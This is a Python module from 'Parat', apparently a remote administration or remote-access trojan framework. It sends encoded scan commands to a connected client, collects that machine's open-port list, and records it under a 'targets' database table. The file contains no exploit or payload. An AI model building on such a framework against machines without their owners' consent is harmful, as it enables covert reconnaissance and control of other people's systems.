#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import os
from time import sleep
from lib.ParatPrint import colorize, pprint
from lib.ProcessThread import ParatProcessBar
from lib.ParatEncrypt import Encode, Decode


class ParatScanner:

    def __init__(self, conn, client_id, db_connection, args, colors):

        self.conn       = conn
        self.client_id  = client_id
        self.db_con     = db_connection
        self.args       = args
        self.colors     = colors
        self.handler    = "#DATA_HANDLER"
        self.scan_file  = "scan.txt"
        self.uflag      = False


    def prepare_basics(self):
        try:
            update = self.args[0]
            self.uflag = True if update == "-u" else False
        except:
            self.uflag = False



    def recive_online(self):

        self.conn.send(Encode("#FSCAN"))

        text = colorize(
            "scanning",
            colored=self.colors,
            status="INF"
        )
        process_bar = ParatProcessBar(text)
        process_bar.start_process()

        response = Decode(self.conn.recv(4096))

        # write data to disk
        with open (self.scan_file, "w") as info_file:
            info_file.write(response.replace(self.handler, "").rstrip())
        info_file.close()

        process_bar.Stop = True; sleep(0.2)

        pprint("\n")
        pprint(response.replace(self.handler, "").rstrip())
        pprint("\n\n")

        self.db_con.execute("UPDATE targets SET oPorts=? WHERE id=?", (response.replace(self.handler, "").rstrip(), self.client_id))
        self.db_con.commit()


    def read_offline(self):

        self.conn.send(Encode("#NFSCAN"))
        with open(self.scan_file, 'r') as info:

            content = info.read()

            pprint('\n' + content + '\n\n')

            self.db_con.execute("UPDATE targets SET oPorts=? WHERE id=?", (content, self.client_id))
            self.db_con.commit()

        info.close()



    def start(self):

        try:
            self.conn.send(Encode("scan"))

            # check for first connection
            if self.uflag or not os.path.isfile(self.scan_file):
                self.recive_online()
            else:
                self.read_offline()


        except Exception as e:

            pprint(
                colorize(
                    str(e) + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)
